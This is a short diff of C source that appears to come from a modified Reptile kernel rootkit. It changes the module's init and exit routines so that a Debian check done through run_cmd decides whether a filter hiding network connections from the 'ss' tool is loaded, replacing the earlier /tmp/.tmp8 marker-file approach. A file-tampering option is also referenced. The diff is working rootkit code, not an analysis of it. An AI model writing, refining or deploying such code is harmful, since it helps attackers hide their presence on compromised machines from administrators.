@@ -602,15 +602,10 @@ static int __init reptile_init(void)
 
 	//own add
 #ifdef CONFIG_HIDE_CONN_FROM_SS
-	struct file *fp;
-	run_cmd("(uname -a | grep -i debian | grep -v grep) && touch /tmp/.tmp8");
-	fp = filp_open("/tmp/.tmp8", O_RDWR, 0644);
-    if(IS_ERR(fp)) {
+	int xret;
+	xret = run_cmd("uname -a | grep -i debian");
+	if(xret == 1) {
 		filter_init();
-    }
-	else{ // open file success
-		filp_close(fp,NULL);
-		run_cmd("rm -f /tmp/.tmp8");
 	}
 #endif
 	// own add end
@@ -653,16 +648,11 @@ static int __init reptile_init(void)
 static void __exit reptile_exit(void)
 {
 #ifdef CONFIG_HIDE_CONN_FROM_SS
-	struct file *fp;
-	run_cmd("(uname -a | grep -i debian | grep -v grep) && touch /tmp/.tmp8");
-	fp = filp_open("/tmp/.tmp8", O_RDWR, 0644);
-    if(IS_ERR(fp)) {
+    int ret ;
+    ret = run_cmd("uname -a | grep -i debian");
+    if(ret) {
 		filter_exit();
     }
-	else{ // open file success
-		filp_close(fp,NULL);
-		run_cmd("rm -f /tmp/.tmp8");
-	}
 #endif
 
 #ifdef CONFIG_FILE_TAMPERING
